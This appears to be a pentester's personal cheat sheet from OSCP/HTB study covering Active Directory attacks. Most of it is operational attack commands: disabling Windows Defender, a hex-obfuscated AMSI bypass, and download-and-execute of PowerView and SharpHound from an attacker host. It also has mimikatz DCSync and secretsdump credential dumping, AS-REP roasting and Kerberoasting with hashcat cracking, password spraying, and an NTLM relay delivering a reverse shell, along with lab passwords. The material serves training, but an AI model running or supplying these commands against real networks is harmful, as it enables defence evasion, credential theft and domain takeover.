Active Directory AD enumeration can be done on powershell if we lauch with `powershell -ep bypass` . I have the `AD-Enum-Script.ps1`

Function to search different class of objects in AD via ldap. Import with `PS C:\Users\stephanie> Import-Module .\function.ps1`
```powershell
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName  

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```
Can be called with 

```powershell
PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(samAccountType=*)"
PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(samAccountType=805306368)"   # users
PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(objectclass=group)"
```
```
/home/kali/OSCP/AD+Win-Tools              # AD Tools are placed in this dir on my Kali Machine
```

## Disable Anti-virus (Antivirus)

```
P:> Set-MpPreference -DisableRealtimeMonitoring $true      # Disable Anti-virus monitoring (Defender)
Set-MpPreference -DisableRealtimeMonitoring $true

```

```
C:> reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f      # Disable Anti-virus - Disable Real time monitoring 

C:> sc stop WinDefend         # Disable Anti-virus - 1 Stop Windows Defender Service (if not protected by GPO/Tamper Protection)  # Disable Anti-virus -

C:> reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f                        # Disable Anti-virus - 3. Disable Real-Time Monitoring via Registry - Disable Defender via Registry (persistent)

C:> reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Tools" /t REG_SZ /d "C:\Tools" /f                  # Disable Anti-virus - 4. Add Exclusions via Registry

C:> schtasks /create /tn "BypassDefender" /tr "C:\Tools\mimikatz.exe" /sc once /st 00:00 /ru SYSTEM                               # Disable Anti-virus - 5. Using Task Scheduler to disable Defender or run malware
C:> schtasks /run /tn "BypassDefender"                                                                                            # Disable Anti-virus - 5. Using Task Scheduler to disable Defender or run malware

```



### ASMI bypass (to download powerview etc)

Next time look at all of this - https://github.com/t3l3machus/PowerShell-Obfuscation-Bible?tab=readme-ov-file  ( the guy also has a YT clip - https://www.youtube.com/watch?v=tGFdmAh_lXE)

**AMSI (Antimalware Scan Interface) is an algorithm used by defender or AV to scan the script before running it .** - AMSI is essentially middle ware (`.dll` file )to pass every command to Defender and then defender will judge, pass back to AMSI and then permit or deny the command. 
Lots of By passes technicques here - https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell 
- Especially Matt Graebers fav - https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#using-matt-graebers-reflection-method
Good blog about HEX encoding all this by the same author - https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/ 
Ultimatly looking like this : 

```powershell
PS> [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)           # AMSI bypass command Matt Greabers Fav
```
Defender will do a regex for a strinig ".AmsiUtils" so we needed to encode it as above. Vix in Offsec



This should then permit you download `Powerview.ps1`

```powershell
PS:> IEX (New-Object Net.WebClient).DownloadString('http://<HACKER_IP>:8000/powerview.ps1')       # Get and Invoke POwerview - BUT IT WILL LIKLEY TRIGGER AV!! (IEX == Invoke Experessino)
``` 

Amsi Trigger tool for testing signatues on Test envs pre engagement - https://github.com/RythmStick/AMSITrigger?tab=readme-ov-file


### Powerview script
AD Enumeration with [PowerView](https://powersploit.readthedocs.io/en/latest/Recon/)
- https://powersploit.readthedocs.io/en/latest/Recon/

I thnk it can be found here in Kali: `/usr/share/powershell-empire/empire/server/data/module_source/situational_Awareness/network/powerview.ps1`

HArmjoys gist with some good comands for Powerview use - https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

You can import powerview into memory in powershell. I think not to disk (??).
The way you do this is to assign it to a variable as you download it eg;
```ps
PS> $Power=(New-Object Net.WebClient).DownloadString('http://192.168.179.178:8000/powerview.ps1')
PS> IEX $Power
```

Import it to  memory it with `PS C:\Tools> Import-Module .\PowerView.ps1`
A list of possible commands for powerview  - https://powersploit.readthedocs.io/en/latest/Recon/#powerview

You can import powerview into memory in powershell.
The way you do this is to assign it to a variable as you download it eg;

```ps
PS> $Power=(New-Object Net.WebClient).DownloadString('http://<HACKER_SERVER>:8000/powerview.ps1')
PS> IEX $Power
```
If there is AV in play, you can bypass this with AMSI (Above)


To get help on a module use `Get-Help <PowerViewCommandlet>`


```sh
# 1. General Domain Enumeration - Powerview
Get-Domain                                                                  # Powerview - General enumeration of the domain
Get-DomainController                                                        # Powerview - Get details of the domain controller
Get-DomainPolicy | select -ExpandProperty systemaccess                      # Powerview - Get the domain's password policy

# 2. Computer Enumeration - Powerview
Get-DomainComputer | select cn,samaccountname                               # Powerview - Enumerate computers and accounts
Get-NetComputer                                                             # Powerview - List all computer objects
Get-NetComputer | select name                                               # Powerview - List all computer objects by name
Get-NetComputer | select operatingsystem,dnshostname                        # Powerview - List OS and DNS hostname
Get-NetComputer | select name,operatingsystem,distinguishedname             # Powerview - Get OS and distinguished name
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion # Powerview - Detailed OS enumeration
Resolve-IPAddress <DNS-HOSTNAME>                                            # Powerview - Get IP address based on DNS hostname
Find-GPOComputerAdmin –Computername <ComputerName>                          # Powerview - Find users with local admin rights over a machine

# 3. User Enumeration - Powerview
Get-DomainUser | select name,memberof                                       # Powerview - Enumerate domain users and their group memberships
Get-NetUser                                                                 # Powerview - Get all details of all users
Get-NetUser | select cn                                                     # Powerview - Get just the usernames
Get-NetUser | select cn,pwdlastset,lastlogon                                # Powerview - Users' last logon and password set dates
Get-NetUser -SPN | select cn,samaccountname,serviceprincipalname            # Powerview - Enumerate service accounts for Kerberoasting
Get-DomainUser -SPN                                                         # Powerview - List service accounts
Get-DomainUser -PreauthNotRequired | select name                            # Powerview - Accounts vulnerable to AS-REP Roasting
Set-DomainUserPassword -Identity robert -AccountPassword (ConvertTo-SecureString "Tuesday@2" -AsPlainText -Force)   # Powerview - Change user password

# 4. Group Enumeration - Powerview
Get-NetGroup | select cn,name                                               # Powerview - Enumerate all groups in the domain
Get-NetGroup 'Domain Admins'                                                # Powerview - List members of Domain Admins
Get-NetGroup "*admin*" | select name                                        # Powerview - Search for groups with "admin" in their names
Get-NetGroup "Sales Department" | select member                             # Powerview - Enumerate members of a specific group
Get-NetGroup "Enterprise Admins" | select member                            # Powerview - Check nested group members for Enterprise Admins
Get-NetGroupMember -MemberName "domain admins" -Recurse | select MemberName # Powerview - Get all members of Domain Admins
Get-DomainGroupMember -Identity "Domain Admins" -Recurse                    # Powerview - Enumerate Domain Admins group, including nested groups

# 5. Share Enumeration - Powerview
Get-NetShare                                                                # Powerview - Get all network shares in the current domain
Find-DomainShare                                                            # Powerview - Find shares across the domain
Find-DomainShare -CheckShareAccess                                          # Powerview - Find accessible shares for the current user
ls \\dc1.corp.com\sysvol\corp.com\                                          # Powerview - List Sysvol shares
Invoke-ShareFinder -Verbose                                                 # Powerview - Search for shares across the domain (noisy)
Get-NetFileServer -Verbose                                                  # Powerview - Get file servers in the domain based on SPN

# 6. Session and Logon Enumeration - Powerview
Get-NetLoggedon                                                             # Powerview - Get users logged onto the local machine
Get-NetLoggedon | select username                                           # Powerview - Enumerate logged-on users
Get-NetLoggedon -ComputerName <servername>                                  # Powerview - Enumerate remote logged-on users
Get-NetSession                                                              # Powerview - Enumerate sessions on the local machine
Get-NetSession -ComputerName <servername>                                   # Powerview - Enumerate sessions on remote machines
Find-DomainUserLocation [-CheckAccess] | select UserName, SessionFromName   # Powerview - Find where domain users are logged in

# 7. Local Group Enumeration - Powerview
Get-NetLocalGroup | Select-Object GroupName                                 # Powerview - Enumerate local groups on the machine

# 8. ACLs and Permissions - Powerview
Get-ObjectAcl -Identity <OBJECT_NAME>                                       # Powerview - Get ACLs for an object (user, computer, etc.)
Get-ObjectAcl -Identity <OBJECT_NAME> | select SecurityIdentifier,ActiveDirectoryRights  # Powerview - Filter object ACLs
Convert-SidToName <SID_VALUE_LONG_STRING_ID>                                # Powerview - Convert SID to readable name
Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs                         # Powerview - Enumerate ACLs for the "users" group
Find-InterestingDomainAcl                                                   # Powerview - Identify interesting ACLs for privilege escalation (noisy!)
Get-DomainObjectAcl -Identity <user> -ResolveGUIDs                          # Powerview - Get ACLs for a specific user
Get-PathAcl -Path "\\10.0.0.2\Users"                                        # Powerview - Get ACLs for a specific path

# 9. Privilege Escalation - Powerview
Invoke-UserHunter                                                           # Powerview - Search for high-value targets to escalate privileges
Invoke-UserHunter [-CheckAccess]                                            # Powerview - Check if local admin on machines with high-value sessions
Get-ObjectAcl -Identity "<AD-OBJECT>" | ? {$_.ActiveDirectoryRights -eq "<ACE_VALUE>"} | select SecurityIdentifier,ActiveDirectoryRights     # Powerview - Look for objects with ACE privileges
Convert-SidToName                                                           # Powerview - Convert SIDs to names for privilege escalation
Find-InterestingDomainAcl                                                   # Powerview - Find ACLs with loose permissions
Get-ForestTrust -Forest "external.local"                                    # Powerview - Identify trusts with external forests
net group "Management Department" stephanie /add /domain                    # Powerview - Add user to domain group (privilege escalation)

# 10. OU Enumeration - Powerview
Get-NetOU                                                                   # Powerview - Enumerate all Organizational Units in the domain
Invoke-ACLScanner -ResolveGUIDs                                             # Powerview - Search for interesting ACLs in OUs

# 11. Domain Trust Enumeration - Powerview
https://nored0x.github.io/red-teaming/active-directory-Trust-enumeration/ - Refernce artice
Get-NetDomainTrust                                                          # Powerview - Enumerate all domain trusts in the current domain
Get-NetDomainTrust -Domain <DomainName>                                     # Powerview - Enumerate trusts for a specific domain
Get-DomainTrustMapping                                                      # Powerview - Visualize trust relationships within the domain

# 12. Forest Enumeration - Powerview
Get-NetForest                                                               # Powerview - Retrieve details about the current forest
Get-NetForest -Forest <ForestName>                                          # Powerview - Retrieve details about a specified forest
Get-NetForestDomain                                                         # Powerview - List all domains within the current forest
Get-NetForestDomain -Forest <ForestName>                                    # Powerview - List all domains within a specified forest

# 13. Global Catalog Servers - Powerview
Get-NetForestCatalog                                                        # Powerview - Identify all global catalog servers in the current forest
Get-NetForestCatalog -Forest <ForestName>                                   # Powerview - Identify global catalog servers in a specified forest

```

### Powerview ( Fro mthe htb course on AD Enum+ATax)
```sh
Export-PowerViewCSV                        # Powerview htb - Append results to a CSV file
ConvertTo-SID                              # Powerview htb - Convert a User or group name to its SID value
Get-DomainSPNTicket                        # Powerview htb - Requests the Kerberos ticket for a specified Service Principal Name (SPN) account

#### Domain/LDAP Functions: 	
Get-Domain                                 # Powerview htb - Will return the AD object for the current (or specified) domain
Get-DomainController                       # Powerview htb - Return a list of the Domain Controllers for the specified domain
Get-DomainUser                             # Powerview htb - Will return all users or specific user objects in AD
Get-DomainComputer                         # Powerview htb - Will return all computers or specific computer objects in AD
Get-DomainGroup                            # Powerview htb - Will return all groups or specific group objects in AD
Get-DomainOU                               # Powerview htb - Search for all or specific OU objects in AD
Find-InterestingDomainAcl                  # Powerview htb - Finds object ACLs in the domain with modification rights set to non-built in objects
Get-DomainGroupMember                      # Powerview htb - Will return the members of a specific domain group
Get-DomainFileServer                       # Powerview htb - Returns a list of servers likely functioning as file servers
Get-DomainDFSShare                         # Powerview htb - Returns a list of all distributed file systems for the current (or specified) domain

#### GPO Functions: 	
Get-DomainGPO                              # Powerview htb - Will return all GPOs or specific GPO objects in AD
Get-DomainPolicy                           # Powerview htb - Returns the default domain policy or the domain controller policy for the current domain

#### Computer Enumeration Functions: 	
Get-NetLocalGroup                          # Powerview htb - Enumerates local groups on the local or a remote machine
Get-NetLocalGroupMember                    # Powerview htb - Enumerates members of a specific local group
Get-NetShare                               # Powerview htb - Returns open shares on the local (or a remote) machine
Get-NetSession                             # Powerview htb - Will return session information for the local (or a remote) machine
Test-AdminAccess                           # Powerview htb - Tests if the current user has administrative access to the local (or a remote) machine

#### Threaded 'Meta'-Functions: 	
Find-DomainUserLocation                    # Powerview htb - Finds machines where specific users are logged in
Find-DomainShare                           # Powerview htb - Finds reachable shares on domain machines
Find-InterestingDomainShareFile            # Powerview htb - Searches for files matching specific criteria on readable shares in the domain
Find-LocalAdminAccess                      # Powerview htb - Find machines on the local domain where the current user has local administrator access

#### Domain Trust Functions: 	
Get-DomainTrust                            # Powerview htb - Returns domain trusts for the current domain or a specified domain
Get-ForestTrust                            # Powerview htb - Returns all forest trusts for the current forest or a specified forest
Get-DomainForeignUser                      # Powerview htb - Enumerates users who are in groups outside of the user's domain
Get-DomainForeignGroupMember               # Powerview htb - Enumerates groups with users outside of the group's domain and returns each foreign member
Get-DomainTrustMapping                     # Powerview htb - Will enumerate all trusts for the current domain and any others seen.
```

```ps
PS C:\Tools> Find-DomainShare -CheckShareAccess

Name                  Type Remark                 ComputerName
----                  ---- ------                 ------------
docshare                 0 Documentation purposes FILES04.corp.com
Important Files          0                        FILES04.corp.com
ADMIN$          2147483648 Remote Admin           client74.corp.com
```

To list of cat, We can think of these in the following way:
`ls \\FILES04\docshare\docs\alldo-not-share`
`ls \\<COMPUTER_NAME>\<SHARENAME>\docs\alldo-not-share`
Find a file we want:
`PS C:\Tools> cat '\\FILES04.corp.com\Important Files\proof.txt'`

Checking if Net-Logged on is possible Get-Net Session enmum will still work. After Windows 10 Build 1709, there was a change to the registry Hive which restricted visibilty to the 
``` sh
PS C:\Tools> Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
# Get ACLS Path
# Get the default security settings related to the LanmanServer service (responsible for file and printer sharing in Windows). 
# Format it to a list 
```

#### PsLoggedOn.exe
```
PS:> Get-ChildItem -Path C:\ -Filter "PsLoggedon.exe" -Recurse -ErrorAction SilentlyContinue   # Where is PsLoggedOn.exe on the machine?
PS:> .\PsLoggedon.exe \\client74                                                               # PsLoggedOn - See who logged on
```

##### Native to windows commands
```
setspn -L iis_service                                         # List all the service principle names on the domain
net group "Management Department" stephanie /add /domain      # add stephanie to the Managment Department domain group /del can be used as well as /add - Good for AD Priv esc , with Powerview
``` 

#### ACEs attackers are intrested in for AD Priv esc

These **Active Directory (AD) permissions** or **Access Control Entry (ACE) rights** applied to objects like users, groups, and other directory entities. They define  actions a user or principal can perform on the object. 

```
GenericAll                  # ACE for Priv esc - Full permission on the object. Might aswell be the DA
GenericWrite                # ACE for Priv esc - Edit certain attributes of an object. We might be able ot take over
WriteOwner                  # ACE for Priv esc - change the owner . this will allow you to eventually change the password if you make the attacker the owner
WriteDACL                   # ACE for Priv esc - Edit ACE's applied to objects
AllExtendedRights           # ACE for Priv esc - allows password change on an object
ForceChangePassword         # ACE for Priv esc - Password CHange for an object. No old password required
Self (Self-memebrship)      # ACE for Priv esc - add out selves to a groups
```

Search for ACL ACE with a particukalr ACL GenericAll - for AD Priv esc
```
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

```
PS C:\Tools\PSTools> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
CORP\Domain Admins
CORP\stephanie
BUILTIN\Account Operators
Local System
CORP\Enterprise Admins
PS C:\Tools\PSTools>| 
```


```
Find-InterestingDomainObjectAcl -ResolveGUIDs | Export-Csv aclscan.csv              # Powerview - ACLs ACe Check - see this alos : https://powersploit.readthedocs.io/en/latest/Recon/Find-InterestingDomainAcl/
```
---

### GPO Abuse 
Tool: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe  - Tool for GPO Abuse if applicable - See OFfsec Vault Official Walkthrough etc




----

### AD Domain Controller Syncronisation (DC Sync attack)

MimiKatz DC sync attack on user dave. Mimikatz will  . Needs to be admin etc or Acc with _Replicating Directory Changes/Changes All/Changes in Filtered Set_ 
```
mimkatz # lsadump::dcsync /user:corp\<TARGET_USERNAME>                                                            # AD - Windows Privesc - DC Sync - on target user we want credentials for 
mimkatz # lsadump::dcsync /user:corp\dave                                                                         # AD - Windows Privesc - DC Sync - example on User dave 
echo 08d7a47a6f9f66b97b1bae4178747494 > hashes.dcsync                                                             # AD - Windows Privesc - DC Sync - example on User dave  - Copy the hash to a local file 
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force    # AD - Windows Privesc - DC Sync - NTLM hash crack mode 1000 
```

Impacket DC Sync attack on Linux 
```
impacket-secretsdump -just-dc-user <TARGET-USERNAME> <DOMAIN>/<PRIVLEGED-USERNAME>:<PASSSWORD>@<DC-IP>            # AD - Windows Privesc - DC Sync from Linux - comand 
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023!"@192.168.179.70        # AD - Windows Privesc - DC Sync from Linux DC Sync - Output NTLM is the second half "08d7....7494" of dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
"
```

## Windows Scritps (Misc)
```
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin        # Sprays passwords and automatically obtains users. Password file can be supplied with the "-File" flag, -Admin flag will search for admins too

```

# Sharphound ( AD Data collection )
Call a listener to get a file 
```
Invoke-WebRequest -Uri "http://10.10.14.66/SharpHound.ps1" -OutFile ".\SharpHound.ps1"                              # Sharphound BloodHound - Transfer to the host
powershell -ep bypass                                                                                               # Sharphound BloodHound - permit the scripts
Import-Module .\Sharphound.ps1                                                                                      # Sharphound BloodHound - Import into powershell
Get-Help Invoke-BloodHound                                                                                          # Sharphound BloodHound - Gethelp if needed
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"     # Sharphound BloodHound - Run the full collections - cmd requires output details else it might not write
SharpHound.exe --CollectionMethods Session --Loop --Loopduration 00:10:00                                           # Sharphound BloodHound - loop over 10 mins 
```

```
SharpHound.exe --CollectionMethods All
```

Transfer the data over to Kali
```
K: sudo systemctl status ssh
K: sudo systemctl start ssh  
PS:>  scp .\SharpHound-DATA.zip kali@192.168.179.237:/home/kali/OSCP/
K: sudo systemctl stop ssh  
```

```
# Sharphound BloodHound Transferring files wthout ssh from
K:> impacket-smbserver share /home/kali/share -smb2support -username <KALI-USERNAME> -password <KALI-PASSWORD>    # Transferring files from Win to Kali 

K:> impacket-smbserver share . -smb2support                                                                       # Sharphound BloodHound - Transfeerring scan data back - open Kali smb share in pwd
C:> copy "C:\Users\Administrator\Documents\corp audit_20241205110736_BloodHound.zip" \\192.168.179.247\share       # Sharphound BloodHound - Transfeerring scan data back - send vuia cmd to kali share

PS:> net use Z: \\<KALI_IP>\share /user:<KALI-USERNAME> <KALI-PASSWORD>                                           # Transferring files from Win to Kali 
PS:> copy C:\FILE\YOU\WANT\Transfered Z:\                                                                         # Transferring files from Win to Kali 
```
# BLOODHOUND

## Bloodhound ( AD Data Visulaisation and attack path mappping )

here `bloodhound-python` is the data collector (like `SharpHound.exe`), which can be used remotely and then the data zipped up to put into `bloodhound` 

```sh
sudo apt install bloodhound
sudo pip install bloodhound-python
bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All

zip AD-BH-info.zip *.json  # zip up all the json files from BH-Python
```

```
sudo bloodhound-python -u 'USERN' -p 'PASSWD' -ns <DC_IP_ADD> -d <DOMAIN> -c all
```

## Bloodhound (...but first NEO4J)
- `sudo -apt-get update && sudo apt install bloodhound`
  
1. `neo4j` is the database that needs to be run along side bloodhound. Neo4j also has query language to make custom queries in Bloodhound. 
2. drag the zip in to the Bloodhound UI and it will process the files to allow queries

### neo4j (trouble shooting)
Lets say we forgot our neo4j password.
We can run 
```sh
loacate neo4j | grep auth
/usr/share/neo4j/data/dbms/auth
rm -rf /usr/share/neo4j/data/dbms/auth
```
When you start up neo4j: `neo4j console` you can then go to the web port and reset the password! 

Default Creds `neo4j/neo4j`.

### Bloodhound community edition as a container
[Bloodhound docs](https://bloodhound.readthedocs.io/en/latest/index.html)

From Kali, Bloodhound is best run as a container on docker . do this in the dir you want to run it from
```
curl -L https://ghst.ly/getbhce > docker-compose.yml     # Get the bloodhound manifest file   
docker-compose up

# if you need to stat again you will need to delete the volume created as well as the container else you wont see the password (this caught me out) 
docker compose down -v
```

Run collector on target:
- `./Sharphound.exe -c all, gpolocalgroup` 

Other options:
```
--stealth       # if you want ot be stealth 
--zipfilename   # good for obfuscating the file name if there is an edr check for *bloodhound*
--encryptzip    # encrypts zp file with random password so domain info cnt be read by any
-gplocalgroup   # Attempt to get Group Policy Objects from computer to correlate and determine members of the relevant local groups on each computer in the domain.
```
#### Start bloodhound:
- `bloodhound --no-sandbox`
Once data has been ingested 
1. Mark things that are owned **as OWNED**.
2. Good start from the queries is `Shortest Path from Owned Principles`

#### Analysis of Data with Bloodhound
1st Click on the hamburger in the BH gui to see the DB stats. Cna take time in large envs. Scroll to the bottom to and PRess the `Refresh Database stats`
Switch to the the `Analysis` button to see the many filter opotions. 
In the graph we can toggle information on the nodes with the `Ctrl` button.
Setting can be set on the cog, eg `Labels always on nodes`.

In the _Analysis_ section, The `Shortest Path` section is quite handy.

**Bloodhound - Low hanging fruit** pre-built search queries:
- _Find all Domain Admins_
- _Shortest Path to Domain Admins from Owned Principals_
- _Find Workstations where Domain Users can RDP_
- _Find Servers where Domain Users can RDP_
- _Find Computers where Domain Users are Local Admin_
- FInd principles with [DCSync Rights](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync#dcsync) 
  - You can essential run any command on the domain. Domain controllers need a way to Syncronise so they operate with the same infor. It could also be a Privesc opertunity.
- Look through each item in the `Node Info` tab of BH.
- Right click on an edge or node and read the `ABUSE` ab as this will explain the `prv esc`

### Bloodhound cipher QL search filter examples
Select a set of objects and declare a variable `m` which is of all `Computer` objects . We then `RETURN` the resulting graph of the objects in `m`
```   
MATCH (m:Computer) RETURN m                                    # Bloodhound cipher filter for all computers 

MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p        # Bloodhound cipher filter for active sessions  
```
HTB article mentioned - https://blog.cptjesus.com/posts/introtocypher/ TODO : GO through this 

#### Data collection stage on a windpows machine
```
# Download and then run Bloodhound
IEX (New-Object Net.Webclient).downloadstring("http://10.10.14.15:8080/SharpHound.ps1")
Invoke-BloodHound -CollectionMethod All, gpolocalgroup
```


### Bloodhound python

```
K:> bloodhound-python -u fmcsorley -p 'CrabSharkJellyfish192' -ns <TARGET_IP> -d hutch.offsec -c all     # Bloodhound collection locally with creds, Creates json files for upload.  
```
# ------------------ END OF ACTIVE DIRECTORY AD  ------------------

----


### What is NTLM (New Technology Lan Manager)?

NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response
authentication protocol used to authenticate a client to a resource on an Active Directory domain.
It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor
only once, at login.
The NTLM authentication process is done in the following way :
1. The client sends the user name and domain name to the server.
2. The server generates a random character string, referred to as the challenge.
3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the
server.
4. The server retrieves the user password (or equivalent).
5. The server uses the hash value retrieved from the security account database to encrypt the challenge
string. The value is then compared to the value received from the client. If the values match, the client
is authenticated.

Read: https://www.ionos.com/digitalguide/server/know-how/ntlm-nt-lan-manager/

"NTLM vs NTHash vs NetNTMLv2"

The terminology around NTLM authentication is messy, and even pros misuse it from time to time, so let's
get some key terms defined:

- A **hash function** is a one way function that takes any amount of data and returns a fixed size value.
Typically, the result is referred to as a hash, digest, or fingerprint. 

- An **NTHash** is the output of the algorithm used to store passwords on Windows systems in the SAM
database and on domain controllers. An NTHash is often referred to as an NTLM hash or even just an
NTLM, which is very misleading / confusing.

- When the NTLM protocol wants to do authentication over the network, it uses a challenge / response
model as described above. A **NetNTLMv2 challenge / response** is a string specifically formatted to
include the challenge and response. This is often referred to as a NetNTLMv2 hash, but it's not actually a hash. 

Still, it is regularly referred to as a hash because we attack it in the same manner. You'll see
NetNTLMv2 objects referred to as NTLMv2, or even confusingly as NTLM.

**NTLM protocol vs NTLM Hashing** When NTLM authentication is disabled in a network, it means the `NTLM protocol`is not used for client-server authentication. **However**, the underlying **NTLM hashing** algorithm might still play a role in other parts of the security infrastructure, such as in the Kerberos authentication process. 

#### Create an NTLM hash hash in python 
```py
import hashlib
hash = hashlib.new('md4',<PLAINTEXT_PASSWORD>.encode('utf-16le')).digest().hex()
print(hash)
```

Read: https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds#lfi
These tools:
- https://github.com/SpiderLabs/Responder
- https://github.com/Hackplayers/evil-winr  # With Creds Log into (Remote management) on Windows servers 
  - `evil-winrm -i 10.129.82.210 -u administrator -p badminton`

## Relaying NTLMv2
NTLM Relaying needs 4 things
- A compromised machine
- A ntlmRelay server
- A Reverse shell listener
- The target you want to get the System reverse shell from 

1. Assume we have control of a ***compromised*** machine or we can run powershell commands and we want this machine to relay its auth to the ***Main Target*** Machine
2. Start your local ntlmRelay Server, possibly with 1 of  
  1. `impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET-IP> -c "powershell -enc ...BASE64-ENCODED-PS-REV-SHELL-1Liner-to-port-9999..."`                              # NTLM-RELAYX 
  2. `impacket-ntlmrelayx --no-http-server -smb2support -t <IP_ONWARD_TARGET>`                                                                                                  # NTLM-RELAYX without a command - offsec Laser

3. Start a local net cat listener on port 9999
4. Run a command on the compromised machine to read a share on your local machine with the relay server.
5. The relay server should Relay (forward) on the connection to the Target Machine, along with your encoded reverse shell command. 
6. See the Shell!


### Kebereros
- `sudo apt -y install krb5-user -y` - Kerberos client utilities - ( *nix only ??)                        # Kerberos tools
- `sudo apt -y install kinit` -                                                                           # Kerberos tools
-  On mac `https://formulae.brew.sh/formula/krb5`                                                         # Kerberos tools
- `kinit` is a cli tool that allows users to obtain and cache an initial TGT from a KDC.                  # Kerberos tools


###### Local Kerberos Config

**IF WE NEED TO EDIT THESE ALYAS MAKE A BACKUP FIRST !!!**

nxc can make a kerberoast config ( HTB Vintage)
```
nxc smb dc01.vintage.htb -u c.neri -p 'Zer0the0ne' -k --generate-krb5-file vintage.krb5          # Kerberos config generation - Local Kerberos Config with nxc
```

#### AS-REP Roasting (When the KDC preAuth is NOT required)
 [AS-REP Roasting](https://harmj0y.medium.com/roasting-as-reps-e6179a65216b) - If the KDC is not configured to [(pre)authenticate](https://learn.microsoft.com/en-us/archive/technet-wiki/23559.kerberos-pre-authentication-why-it-should-not-be-disabled) users then it will respond with AS-REP to any other user who asks with an AS-REQ. If we have other known credentials (eg Pete) we can get the TGT of other users to get more creds. The AS-REPly  contains key data which can be cracked(Roasted). 

```
# Linux Based AS-REP Roasting       
impacket-GetNPUsers -dc-ip <DC-IP> -request -outputfile <HASH-OP-FILE> <DOMAIN>/<USER>                        # AS-REP Roasting - needs other known creds to the KDC  
impacket-GetNPUsers -dc-ip 192.168.179.70 -request -outputfile hashes.asreproast corp.com/pete                 # AS-REP Roasting - needs other known creds to the KDC 
impacket-GetNPUsers -dc-ip 192.168.179.70 corp.com/pete                                                       # AS-REP Roasting -  When promted for pete's password; we can list all users vulnerable to AS-REP Roasting 
netexec ldap target-ips.txt -u jim -p 'Castello1!' --asreproast ASREProastables.txt --kdcHost 172.16.139.6     # AS-REP Roasting - Can be done with netexec nxc   
# AS-REP Roasting hashcat mode is 18200


# Windows based AS-REP Roasting with Rubeus
CP:> ./Rubeus.exe asreproast /nowrap                                                                          # AS-REP Roasting - Rubeus will automatically look around the comprimised host and return the hashes unwrapped. Might need to add the compatible seperator "$23$"

# Targeted AS-REP Roasting: If we have GenericWrite or GenericAll controls on another user we can 
Set-DomainObject -Identity "pete" -Set @{userAccountControl=4194304}    # Powerview - Targetd AS-REP roasign enablement with the flag number for unsetting pre-auth on a ser with GenericWrite and GenericAll 


# Cracking hashes of AS-Reproasting with hashcat
hashcat --help | grep -i "Kerberos"    # look for the AS-RepRoast mode ( I think 18200)
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force  # AS-RepRoasting cracking of the hash
```

### Kerberoasting

In short [Kerberoasting](https://blog.harmj0y.net/redteaming/kerberoasting-revisited/) - An attacker leverages a compromised account to request a further  **TGS** for an **SPN** from the **KDC** and then cracks the hash of that **SPN**.

Kerberos Authentication and Service Principal Names Another common technique of gaining privileges within an Active Directory Domain is “Kerberoasting”, which is an offensive technique created by Tim Medin and revealed at DerbyCon 2014.

Kerberoasting involves extracting a hash of the encrypted material from a Kerberos “Ticket Granting Service” ticket reply (TGS_REP), which can be subjected to offline cracking in order to retrieve the plaintext password. This is possible because the TGS_REP is encrypted using the NTLM password hash of the account in whose context the service instance is running. 

